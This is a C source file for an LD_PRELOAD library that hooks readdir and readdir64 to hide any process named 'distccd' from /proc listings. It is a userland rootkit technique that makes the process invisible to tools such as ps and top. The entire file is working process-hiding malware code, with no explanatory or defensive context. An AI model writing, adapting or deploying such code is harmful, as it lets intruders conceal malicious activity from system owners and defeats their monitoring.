#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

#define BUF_SIZE 256
#define TGT_PROC "distccd"

static int get_dir_proc(DIR * const dirp, const char * const pid)
{
	char buf[BUF_SIZE];
	{
		char path[14 + 10] = "/proc/self/fd/";
		const int dir_fd = dirfd(dirp);
		if (dir_fd == -1) return 0;
		snprintf(path + 14, 10, "%d", dir_fd);
		{
			const ssize_t rlc = readlink(path, buf, BUF_SIZE);
			if (!rlc) return 0;
			buf[rlc] = 0;
		}
	}
	if (strncmp(buf, "/proc", 6)) return 0;
	snprintf(buf + 5, BUF_SIZE - 5, "/%s/comm", pid);
	{
		const int fd = open(buf, O_RDONLY);
		if (fd == -1) return 0;
		{
			const ssize_t rdc = read(fd, buf, BUF_SIZE);
			close(fd);
			if (!rdc) return 0;
			buf[rdc - 1] = 0;
		}
	}
	{
		const char proc[] = TGT_PROC;
		return !strncmp(buf, proc, sizeof(proc));
	}
}
#define DECLARE_READDIR(dirent, readdir)                                             \
static struct dirent* (*o_##readdir)(DIR * const) = NULL;                            \
struct dirent* readdir(DIR * const dirp)                                             \
{                                                                                    \
	if (!o_##readdir)                                                                \
		o_##readdir = (struct dirent *(*)(DIR * const)) dlsym(RTLD_NEXT, #readdir);  \
	do {                                                                             \
		struct dirent * const dir = o_##readdir(dirp);                               \
		if (!dir || !get_dir_proc(dirp, dir->d_name)) return dir;                    \
	} while (1);                                                                     \
}
DECLARE_READDIR(dirent64, readdir64)
DECLARE_READDIR(dirent, readdir)
